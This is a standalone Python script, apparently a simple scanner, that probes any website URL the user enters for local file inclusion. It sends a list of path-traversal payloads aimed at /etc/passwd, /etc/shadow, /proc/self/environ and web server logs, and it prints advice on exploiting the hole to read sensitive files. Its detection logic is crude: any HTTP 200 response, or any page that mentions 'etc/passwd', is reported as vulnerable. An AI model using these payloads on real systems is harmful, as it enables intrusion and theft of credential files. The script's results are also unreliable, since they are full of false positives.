import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys

# Function to test for LFI vulnerability
def test_lfi_vulnerability(url):
    print("Testing for Local File Inclusion vulnerability on:", url)
    try:
        # Send a request to the target URL
        response = requests.get(url)
        if response.status_code == 200:
            print("Website is accessible...")
            # Parse HTML content
            soup = BeautifulSoup(response.text, 'html.parser')
            # Check for potential LFI indicators in the response headers and content
            if 'root:' in response.text or 'etc/passwd' in response.text:
                print("\033[91mThe target website is vulnerable to LFI!\033[0m")
                print("\033[91mTo exploit the vulnerability, you can try accessing sensitive files such as /etc/passwd or /etc/shadow.\033[0m")
            else:
                print("\033[92mThe target website is not vulnerable to LFI.\033[0m")
        else:
            print("\033[93mFailed to access the website. Status code:", response.status_code, "\033[0m")
    except Exception as e:
        print("\033[93mAn error occurred:", str(e), "\033[0m")

# Function to test for LFI vulnerability with additional payloads
def test_lfi_with_payloads(url):
    payloads = [
        "../../../../../../../../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../../../../../../../etc/shadow",
        "../../../../../../../../../../../../../../../../../../../etc/hosts",
        "../../../../../../../../../../../../../../../../../../../etc/hostname",
        "../../../../../../../../../../../../../../../../../../../proc/self/environ",
        "../../../../../../../../../../../../../../../../../../../var/log/apache2/access.log",
        "../../../../../../../../../../../../../../../../../../../var/log/apache2/error.log",
        "../../../../../../../../../../../../../../../../../../../var/log/httpd/access.log",
        "../../../../../../../../../../../../../../../../../../../var/log/httpd/error.log",
        "../../../../../../../../../../../../../../../../../../../var/log/nginx/access.log",
        "../../../../../../../../../../../../../../../../../../../var/log/nginx/error.log",
        "../../../../../../../../../../../../../../../../../../../var/log/messages",
        "../../../../../../../../../../../../../../../../../../../var/log/syslog",
    ]

    print("Testing for LFI vulnerability with additional payloads on:", url)
    try:
        for payload in payloads:
            target_url = f"{url}/{payload}"
            response = requests.get(target_url)
            if response.status_code == 200:
                print("\033[91mPossible LFI found with payload:", payload, "\033[0m")
            elif response.status_code == 404:
                print("404 Not Found:", target_url)
            else:
                print("Unexpected status code:", response.status_code, target_url)
    except Exception as e:
        print("\033[93mAn error occurred:", str(e), "\033[0m")

# Main function
def main():
    # Prompt user for target website URL
    target_url = input("Enter your target website URL: ").strip()
    # Check if the URL starts with 'http://' or 'https://'
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url

    # Test for LFI vulnerability
    test_lfi_vulnerability(target_url)

    # Test for LFI vulnerability with additional payloads
    test_lfi_with_payloads(target_url)

if __name__ == "__main__":
    main()
